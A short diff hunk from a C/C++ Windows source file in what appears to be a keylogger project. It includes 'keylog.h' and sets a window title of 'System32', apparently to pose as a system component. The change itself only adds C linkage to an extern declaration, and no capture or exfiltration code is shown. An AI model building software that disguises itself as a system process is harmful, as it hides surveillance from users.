@@ -9,7 +9,7 @@
 #include <neaky/utils.h>
 #include "keylog.h"
 
-extern HINSTANCE hInst;
+extern "C" HINSTANCE hInst;
 
 // 全局变量:
 static WCHAR szTitle[] = L"System32";                  // 标题栏文本
